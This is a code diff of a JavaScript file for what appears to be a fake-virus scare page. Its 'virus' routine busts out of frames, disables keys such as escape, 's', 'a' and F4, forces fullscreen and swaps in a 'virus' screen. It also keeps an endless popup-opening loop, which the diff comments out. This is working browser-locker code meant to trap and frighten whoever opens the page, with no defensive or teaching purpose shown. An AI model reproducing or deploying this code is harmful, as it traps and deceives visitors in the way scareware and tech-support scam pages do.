@@ -3,18 +3,19 @@
 function virus(){
 
 	bloqueo();
-	maximizar();
-	//cargaPaginas();
+	ocultar();
+	//maximizar();
 }
+
 
 function bloqueo(){
 if(top.location != self.location)
   top.location = self.location;
-shortcut.add("F1",function() {
+shortcut.add("s",function() {
 });
-shortcut.add("F2",function() {
+shortcut.add("a",function() {
 });
-shortcut.add("F3",function() {
+shortcut.add("escape",function() {
 });
 shortcut.add("F4",function() {
 });
@@ -50,52 +51,36 @@ function maximizar(){
 
 function cargaPaginas(){
    for(var i = 1; i >= 1;i++){
-     window.open("inicio.php");
+     //window.open("inicio.php");
      
  }
 
 }
 
-// Find the right method, call on correct element
-function launchFullscreen() {
-  if(document.requestFullscreen) {
-    document.requestFullscreen();
-  } else if(document.mozRequestFullScreen) {
-    document.mozRequestFullScreen();
-  } else if(document.webkitRequestFullscreen) {
-    document.webkitRequestFullscreen();
-  } else if(document.msRequestFullscreen) {
-    document.msRequestFullscreen();
+function ocultar(){
+	document.getElementById('virus').style.display = 'block';
+	document.getElementById('info').style.display = 'none';
+	document.body.style.backgroundImage = "url('./images/bk.jpg')";
+
+}
+
+function launchFullscreen(element) {
+  if(element.requestFullscreen) {
+    element.requestFullscreen();
+  } else if(element.mozRequestFullScreen) {
+    element.mozRequestFullScreen();
+  } else if(element.webkitRequestFullscreen) {
+    element.webkitRequestFullscreen();
+  } else if(element.msRequestFullscreen) {
+    element.msRequestFullscreen();
   }
+  virus();
+
+  /*setTimeout(function() {
+    cargaPaginas();
+	}, 4000);*/
+
 }
 
-function exitFullscreen() {
-  if(document.exitFullscreen) {
-    document.exitFullscreen();
-  } else if(document.mozCancelFullScreen) {
-    document.mozCancelFullScreen();
-  } else if(document.webkitExitFullscreen) {
-    document.webkitExitFullscreen();
-  }
-}
 
-function dumpFullscreen() {
-  console.log("document.fullscreenElement is: ", document.fullscreenElement || document.mozFullScreenElement || document.webkitFullscreenElement || document.msFullscreenElement);
-  console.log("document.fullscreenEnabled is: ", document.fullscreenEnabled || document.mozFullScreenEnabled || document.webkitFullscreenEnabled || document.msFullscreenEnabled);
-}
 
-// Events
-document.addEventListener("fullscreenchange", function(e) {
-  console.log("fullscreenchange event! ", e);
-});
-document.addEventListener("mozfullscreenchange", function(e) {
-  console.log("mozfullscreenchange event! ", e);
-});
-document.addEventListener("webkitfullscreenchange", function(e) {
-  console.log("webkitfullscreenchange event! ", e);
-});
-document.addEventListener("msfullscreenchange", function(e) {
-  console.log("msfullscreenchange event! ", e);
-});
-
-// Add different events for fullscreen
